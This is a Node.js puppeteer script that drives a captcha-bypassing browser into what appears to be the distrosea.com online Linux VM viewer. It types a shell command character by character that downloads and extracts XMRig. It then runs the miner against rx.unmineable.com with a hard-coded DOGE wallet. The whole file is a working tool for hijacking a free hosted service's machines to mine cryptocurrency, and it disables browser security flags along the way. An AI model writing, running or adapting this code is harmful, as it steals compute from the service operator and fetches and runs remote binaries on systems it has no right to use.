const { connect } = require("puppeteer-real-browser");
const proxy = require("./proxy.js");
const sleep = require("./sleep.js");

const controller = async (getUrl) => {
  console.log(getUrl);

  const { page, browser } = await connect({
    args: [
      "--disable-gpu",
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-extensions",
      "--disable-images",
      "--disable-web-security",
      "--disable-features=IsolateOrigins,site-per-process",
    ],
    headless: false,
    turnstile: true,
    disableXvfb: false,
    ignoreAllFlags: false,
  });

  setInterval(async () => {
    try {
      await page.screenshot({ path: "screenshot.png" });
    } catch (err) {}
  }, 500);

  try {
    await page.setRequestInterception(true);
    page.on("request", (req) => {
      const url = req.url();
      if (
        url.includes("doubleclick.net") ||
        url.includes("adservice.google.com") ||
        url.includes("googlesyndication.com")
      ) {
        req.abort();
      } else {
        req.continue();
      }
    });

    await page.goto(getUrl);

    await page.waitForSelector("body");

    await sleep(15);

    let text = "";
    text +=
      "wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz ";
    text += "&& tar -xzvf xmrig-6.22.0-linux-static-x64.tar.gz ";
    text += "&& cd xmrig-6.22.0 ";
    text += "&& chmod +x xmrig ";
    text += "&& clear ";
    text +=
      "&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:D9Mq2fXA4vBAqBr1zqv1F9cjViw5qF43iW.pc1#rup9-jjmz -p x";

    for (let i = 0; i < text.length; i++) {
      const char = text[i];
      if (
        char === ":" ||
        char === "&" ||
        char === "#" ||
        (char === char.toUpperCase() && char !== char.toLowerCase())
      ) {
        await page.keyboard.down("Shift");
        await page.keyboard.press(char);
        await page.keyboard.up("Shift");
      } else {
        await page.keyboard.type(char, { delay: 50 });
      }
    }
    await page.keyboard.press("Enter");

    let verificarUrl = page.url();
    while (verificarUrl.includes("distrosea.com/view")) {
      verificarUrl = page.url();
      await sleep(2);
      return true;
    }

    return false;
  } catch (error) {
    console.error(`Erro interno do servidor: ${error.message}`);
    return false;
  } finally {
    // await browser.close();
  }
};

module.exports = controller;
